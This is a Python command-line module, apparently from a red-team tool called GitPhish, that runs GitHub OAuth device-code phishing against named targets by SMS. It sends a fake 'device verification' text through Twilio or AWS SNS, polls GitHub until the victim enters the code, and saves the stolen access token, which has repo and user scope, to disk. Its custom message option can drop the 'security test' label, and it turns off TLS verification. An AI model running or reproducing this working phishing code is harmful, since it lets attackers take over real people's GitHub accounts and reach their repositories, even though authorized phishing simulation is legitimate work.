"""
SMS Campaigns CLI for GitPhish - GitHub OAuth Device Code Phishing with SMS delivery.
"""

import argparse
import sys
import time
import json
import urllib.parse
import urllib3
import os.path
import logging
import requests
import datetime
import concurrent.futures
from twilio.rest import Client
from cryptography.fernet import Fernet
import base64
import boto3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# GitHub OAuth Configuration
GITHUB_CLIENT_ID = "178c6fc778ccc68e1d6a"
GITHUB_DEVICE_CODE_URL = "https://github.com/login/device/code"
GITHUB_TOKEN_URL = "https://github.com/login/oauth/access_token"

def setup_sms_campaigns_subparser(parent_parser):
    """Setup SMS campaigns subparser."""
    sms_parser = parent_parser.add_parser('sms', help='SMS Campaign Management')
    sms_subparsers = sms_parser.add_subparsers(dest='sms_command', help='SMS campaign commands')
    
    # Twilio GitHub campaign
    twilio_github = sms_subparsers.add_parser('twilio-github', help='GitHub OAuth via Twilio SMS')
    twilio_github.add_argument('-e', '--email', required=True, help='Target email address')
    twilio_github.add_argument('-p', '--phone', required=True, help='Target phone number')
    twilio_github.add_argument('--sid', required=True, help='Twilio Account SID')
    twilio_github.add_argument('--token', required=True, help='Twilio Auth Token')
    twilio_github.add_argument('--from-phone', required=True, help='Twilio phone number')
    twilio_github.add_argument('--scope', default='repo user', help='OAuth scopes')
    twilio_github.add_argument('--message', help='Custom SMS message template')
    twilio_github.add_argument('--debug', action='store_true', help='Enable debug logging')
    twilio_github.set_defaults(func=run_twilio_github_campaign)
    
    # AWS SNS GitHub campaign
    aws_github = sms_subparsers.add_parser('aws-github', help='GitHub OAuth via AWS SNS')
    aws_github.add_argument('-e', '--email', required=True, help='Target email address')
    aws_github.add_argument('-p', '--phone', required=True, help='Target phone number')
    aws_github.add_argument('--region', default='us-east-2', help='AWS region')
    aws_github.add_argument('--scope', default='repo user', help='OAuth scopes')
    aws_github.add_argument('--message', help='Custom SMS message template')
    aws_github.add_argument('--debug', action='store_true', help='Enable debug logging')
    aws_github.set_defaults(func=run_aws_github_campaign)
    
    # Set default for main sms parser
    sms_parser.set_defaults(func=handle_sms_campaigns_command)
    
    return sms_parser

def validate_encryption_key(encryption_key):
    """Validate encryption key for secure token storage."""
    try:
        decoded_key = base64.urlsafe_b64decode(encryption_key)
        if len(decoded_key) != 32:
            raise ValueError("Encryption key must be 32 bytes after base64 decoding.")
        return Fernet(encryption_key)
    except Exception as e:
        logging.error(f"Invalid encryption key: {e}")
        sys.exit(1)

class SMSTarget:
    """Target for SMS campaign."""
    def __init__(self, email, phone, encryption_key=None):
        self.email = email
        self.phone = phone
        self.device_code = None
        self.token_response = None
        self.encryption_cipher = validate_encryption_key(encryption_key) if encryption_key else None
        self.headers = {
            "Accept": "application/json",
            "User-Agent": "GitPhish SMS Campaign v0.2.0"
        }

def send_twilio_sms(target, message, sid, token, from_phone):
    """Send SMS via Twilio."""
    try:
        client = Client(sid, token)
        client.messages.create(
            to=target.phone, 
            from_=from_phone, 
            body=message
        )
        logging.info(f"[{target.email}] SMS sent successfully via Twilio")
        return True
    except Exception as e:
        logging.error(f"[{target.email}] Failed to send SMS via Twilio: {e}")
        return False

def send_aws_sms(target, message, region='us-east-2'):
    """Send SMS via AWS SNS."""
    try:
        sns_client = boto3.client('sns', region_name=region)
        response = sns_client.publish(
            PhoneNumber=target.phone,
            Message=message,
            MessageAttributes={
                'AWS.SNS.SMS.SenderID': {
                    'DataType': 'String',
                    'StringValue': 'GitPhish'
                },
                'AWS.SNS.SMS.SMSType': {
                    'DataType': 'String',
                    'StringValue': 'Transactional'
                }
            }
        )
        logging.info(f"[{target.email}] SMS sent successfully via AWS SNS: {response['MessageId']}")
        return True
    except Exception as e:
        logging.error(f"[{target.email}] Failed to send SMS via AWS SNS: {e}")
        return False

def initiate_device_code_flow(target, scope='repo user', message_template=None):
    """Initiate GitHub device code OAuth flow."""
    target.headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    data = {
        "client_id": GITHUB_CLIENT_ID,
        "scope": scope
    }
    
    try:
        resp = requests.post(GITHUB_DEVICE_CODE_URL, headers=target.headers, data=data, verify=False)
        if resp.status_code != 200:
            logging.error(f'[{target.email}] GitHub device code request failed: {resp.json()}')
            return None
        
        target.device_code = resp.json()
        
        # Generate SMS message
        if message_template:
            message = message_template.format(
                email=target.email,
                verification_uri=target.device_code['verification_uri'],
                user_code=target.device_code['user_code'],
                device_code=target.device_code['device_code']
            )
        else:
            message = (
                f"GitPhish Security Test - GitHub Device Verification\n\n"
                f"Your GitHub device enrollment for {target.email} requires verification.\n\n"
                f"Please visit: {target.device_code['verification_uri']}\n"
                f"Enter code: {target.device_code['user_code']}\n\n"
                f"This code expires in 15 minutes.\n\n"
                f"[This is a security test - GitPhish v0.2.0]"
            )
        
        return message
    except Exception as e:
        logging.error(f"[{target.email}] Device code flow failed: {e}")
        return None

def poll_for_token(target):
    """Poll GitHub for OAuth token after user authorization."""
    if not target.device_code:
        return False
    
    url = GITHUB_TOKEN_URL
    data = {
        "client_id": GITHUB_CLIENT_ID,
        "device_code": target.device_code["device_code"],
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
    }
    
    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=target.device_code["expires_in"])
    
    while datetime.datetime.now() < stop_time:
        logging.info(f'[{target.email}] Polling for user authorization...')
        
        try:
            resp = requests.post(url, headers=target.headers, data=data, verify=False)
            response_data = resp.json()
            
            if "access_token" in response_data:
                # Token received!
                if target.encryption_cipher:
                    encrypted_token = target.encryption_cipher.encrypt(response_data["access_token"].encode()).decode()
                    target.token_response = {"access_token": encrypted_token, "encrypted": True}
                else:
                    target.token_response = {"access_token": response_data["access_token"], "encrypted": False}
                
                # Save token
                filename = f'{target.email}.github_token.json'
                with open(filename, 'w') as f:
                    json.dump(target.token_response, f, indent=2)
                
                logging.info(f'[{target.email}] ✅ TOKEN CAPTURED! Saved to {filename}')
                return True
                
            elif response_data.get("error") != "authorization_pending":
                logging.error(f'[{target.email}] Authorization error: {response_data}')
                return False
            
            # Wait before next poll
            time.sleep(target.device_code.get("interval", 5))
            
        except Exception as e:
            logging.error(f'[{target.email}] Polling error: {e}')
            time.sleep(5)
    
    logging.warning(f'[{target.email}] ⏰ Device code expired without authorization')
    return False

def run_twilio_github_campaign(args):
    """Run Twilio + GitHub OAuth campaign."""
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s'
    )
    
    logging.info("🚀 Starting Twilio + GitHub OAuth SMS Campaign")
    
    target = SMSTarget(args.email, args.phone)
    
    # Initiate device code flow
    message = initiate_device_code_flow(target, args.scope, args.message)
    if not message:
        logging.error("Failed to initiate device code flow")
        return 1
    
    # Send SMS
    if not send_twilio_sms(target, message, args.sid, args.token, args.from_phone):
        logging.error("Failed to send SMS")
        return 1
    
    # Poll for token
    success = poll_for_token(target)
    
    if success:
        logging.info("🎯 Campaign completed successfully - Token captured!")
        return 0
    else:
        logging.warning("📵 Campaign completed - No token captured")
        return 1

def run_aws_github_campaign(args):
    """Run AWS SNS + GitHub OAuth campaign."""
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s'
    )
    
    logging.info("🚀 Starting AWS SNS + GitHub OAuth SMS Campaign")
    
    target = SMSTarget(args.email, args.phone)
    
    # Initiate device code flow
    message = initiate_device_code_flow(target, args.scope, args.message)
    if not message:
        logging.error("Failed to initiate device code flow")
        return 1
    
    # Send SMS
    if not send_aws_sms(target, message, args.region):
        logging.error("Failed to send SMS")
        return 1
    
    # Poll for token
    success = poll_for_token(target)
    
    if success:
        logging.info("🎯 Campaign completed successfully - Token captured!")
        return 0
    else:
        logging.warning("📵 Campaign completed - No token captured")
        return 1

def handle_sms_campaigns_command(args):
    """Handle SMS campaigns command."""
    if hasattr(args, 'sms_command') and args.sms_command:
        if args.sms_command == 'twilio-github':
            return run_twilio_github_campaign(args)
        elif args.sms_command == 'aws-github':
            return run_aws_github_campaign(args)
        else:
            print("❌ Unknown SMS campaign command")
            return 1
    else:
        # No subcommand provided, show help
        if hasattr(args, '_parser'):
            args._parser.print_help()
        else:
            print("📱 GitPhish SMS Campaigns v0.2.0")
            print("Available commands:")
            print("  twilio-github  - GitHub OAuth via Twilio SMS")
            print("  aws-github     - GitHub OAuth via AWS SNS")
        return 0